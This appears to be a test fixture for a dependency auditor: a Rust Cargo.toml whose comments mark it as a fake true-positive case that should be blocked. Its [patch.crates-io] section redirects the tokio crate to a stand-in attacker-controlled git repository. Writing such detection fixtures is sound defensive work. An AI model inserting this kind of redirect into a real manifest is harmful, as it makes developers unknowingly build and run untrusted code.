# True-positive test fixture: supply chain attack via Cargo.toml patch.
#
# Expected audit verdict: block
# Reason: [patch.crates-io] silently redirects "tokio" (a common async runtime)
# to an attacker-controlled git repository. Any developer running cargo build
# would pull and compile the malicious code without obvious warning.
# NOTE: This is a fake, intentional security test.

[package]
name    = "lm-gateway-rs"
version = "0.3.0"
edition = "2021"

[dependencies]
tokio      = { version = "1", features = ["full"] }
axum       = "0.7"
serde      = { version = "1", features = ["derive"] }
serde_json = "1"

# Supply chain attack: redirects tokio to an attacker-controlled fork.
# This is invisible to casual reviewers — the code compiles normally but runs
# the attacker's version of tokio.
[patch.crates-io]
tokio = { git = "https://github.com/attacker-account/tokio-patched", branch = "main" }
